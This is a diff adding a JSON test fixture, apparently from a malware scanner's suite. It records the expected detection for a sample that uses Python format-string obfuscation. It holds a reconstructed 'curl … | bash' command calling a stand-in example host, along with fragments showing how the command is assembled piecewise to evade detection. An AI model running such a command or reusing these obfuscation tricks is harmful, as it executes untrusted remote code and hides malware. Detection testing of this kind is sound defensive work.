@@ -1,0 +1,43 @@
+{
+  "sample_id": "adv-023-format-string",
+  "test_category": "string_manipulation_obfuscation",
+  "primary_detection": {
+    "code": "STRING-007",
+    "name": "Format String Obfuscation",
+    "description": "Malicious commands constructed using Python format strings with positional, named, and percent formatting",
+    "confidence": 0.89
+  },
+  "underlying_threats": [
+    {
+      "code": "DATA-002",
+      "name": "Remote Code Execution",
+      "description": "Downloads and executes remote scripts via curl/wget",
+      "confidence": 0.93
+    },
+    {
+      "code": "EXEC-003",
+      "name": "Dynamic Code Execution",
+      "description": "Uses exec() with formatted strings containing malicious code",
+      "confidence": 0.91
+    },
+    {
+      "code": "EXEC-001",
+      "name": "Shell Command Injection",
+      "description": "Executes shell commands via os.system and subprocess",
+      "confidence": 0.90
+    }
+  ],
+  "obfuscation_indicators": [
+    "Positional format: '{0}{1}{2}'.format('cur', 'l ', url)",
+    "Named format: '{cmd} | {shell}'.format(cmd=cmd, shell='bash')",
+    "Percent formatting: '%s%s%s' % ('wg', 'et ', url)",
+    "Named percent: '%(cmd)s' % {'cmd': cmd}",
+    "Nested formatting with separate component building",
+    "Multi-level format string composition"
+  ],
+  "reconstructed_payload": "curl https://[REDACTED].example.com/script.sh | bash",
+  "expected_verdict": "确认恶意",
+  "verdict_reasoning": "Deliberate use of format string operations to dynamically construct malicious command strings",
+  "risk_level": "critical",
+  "tags": ["obfuscation", "format-string", "string-format", "percent-format", "remote-code-execution"]
+}
